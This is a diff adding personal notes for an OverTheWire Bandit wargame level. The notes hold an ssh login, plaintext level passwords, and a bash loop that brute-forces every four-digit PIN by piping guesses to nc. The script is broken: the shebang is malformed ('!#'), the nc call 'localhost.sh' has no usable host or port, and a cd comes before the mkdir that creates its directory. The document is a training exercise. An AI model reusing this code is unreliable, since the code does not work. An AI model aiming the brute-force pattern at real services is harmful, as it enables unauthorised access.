@@ -1,0 +1,23 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+# password = UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+cd /tmp/brute-force-matrix
+
+mkdir /tmp/brute-force-matrix
+
+cd /tmp/brute-force-matrix
+
+touch test.sh
+
+nano test.sh
+!#/bin/bash
+
+bandit24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for pin in {0000..9999}; do
+        echo "$bandit24 $pin"
+done | nc localhost.sh
+
+chmod +x test.sh
+
+./test.sh
+#password = uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
